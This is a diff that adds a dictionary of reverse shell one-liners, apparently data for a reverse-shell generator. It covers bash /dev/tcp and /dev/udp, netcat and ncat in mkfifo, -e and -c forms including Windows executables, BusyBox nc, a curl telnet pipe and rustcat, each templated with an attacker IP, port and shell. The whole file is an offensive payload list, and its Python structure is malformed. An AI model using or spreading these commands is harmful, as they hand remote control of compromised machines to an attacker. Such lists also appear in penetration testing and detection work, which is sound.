@@ -1,0 +1,77 @@
+dic = {
+        {
+            "name": "Bash -i",
+            "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
+            
+        },
+        {
+            "name": "Bash 196",
+            "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
+            
+        },
+        {
+            "name": "Bash read line",
+            "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+            
+        },
+        {
+            "name": "Bash 5",
+            "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
+            
+        },
+        {
+            "name": "Bash udp",
+            "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
+            
+        },
+        {
+            "name": "nc mkfifo",
+            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
+            
+        },
+        {
+            "name": "nc -e",
+            "command": "nc {ip} {port} -e {shell}",
+            
+        },
+        {
+            "name": "nc.exe -e",
+            "command": "nc.exe {ip} {port} -e {shell}",
+           
+        },
+        {
+            "name": "BusyBox nc -e",
+            "command": "busybox nc {ip} {port} -e {shell}",
+            
+        },
+        {
+            "name": "nc -c",
+            "command": "nc -c {shell} {ip} {port}",
+            
+        },
+        {
+            "name": "ncat -e",
+            "command": "ncat {ip} {port} -e {shell}",
+            
+        },
+        {
+            "name": "ncat.exe -e",
+            "command": "ncat.exe {ip} {port} -e {shell}",
+            
+        },
+        {
+            "name": "ncat udp",
+            "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
+            
+        },
+        {
+            "name": "curl",
+            "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
+            
+        },
+        {
+            "name": "rustcat",
+            "command": "rcat connect -s {shell} {ip} {port}",
+            
+        }
+}
